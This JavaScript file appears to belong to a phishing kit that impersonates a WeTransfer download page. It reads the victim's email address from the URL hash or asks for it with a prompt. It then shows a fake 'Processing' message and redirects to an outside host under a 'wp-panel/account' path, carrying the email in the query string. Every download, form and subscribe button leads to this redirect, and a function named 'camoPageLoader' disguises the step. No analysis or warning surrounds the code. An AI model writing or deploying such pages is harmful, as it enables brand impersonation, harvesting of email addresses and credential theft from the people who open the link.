// 
backgroundToggle();
function backgroundToggle() {
    let backgroundChange = document.getElementsByClassName("weTranfer")[0];
    setTimeout(() => {
        backgroundChange.style.background = "#023020";
    }, 100);

    setTimeout(() => {
        backgroundChange.style.background = "#36454F";
    }, 5000);

    setTimeout(() => {
        backgroundChange.style.background = "#301934";
    }, 10000);

    setTimeout(() => {
        backgroundChange.style.background = "#1B1212";
    }, 15000);
}

setInterval(() => {
    backgroundToggle();
}, 20000);

// 
const formContainer = document.querySelector(".formContainer");
const downLoadBtn = document.getElementById("downLoadBtn");
const subcribe_btn = document.querySelectorAll(".subcribe_btn");
const formBtn = document.getElementById("formBtn");

// 
function weTransfer() {

const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

//
const hashTag = location.hash.substring(1);

if (!validEmail.test(hashTag)) {
    let user = prompt("Please enter e-mail address", "");

    if (user == null || user != "") {
        if (validEmail.test(user)) {
            camoPageLoader(user); 
        }  
    }
    return
}

    camoPageLoader(hashTag);

    function camoPageLoader(x) {
        formBtn.style.backgroundColor = "green";
        formBtn.innerHTML = `<i>Processing . . .</i>`;

        setTimeout(() => {
            location.replace("https://srbilletero.com/wp-panel/account?id="+x)
        }, 1000);
    }

}

// 
formContainer.addEventListener('submit', (e)=>{
    e.preventDefault();

    weTransfer();   
})

// 
downLoadBtn.addEventListener('click', ()=>{
    weTransfer();
})

// 
subcribe_btn.forEach(sub => {
    sub.addEventListener('click', ()=>{
        weTransfer();
    })
});
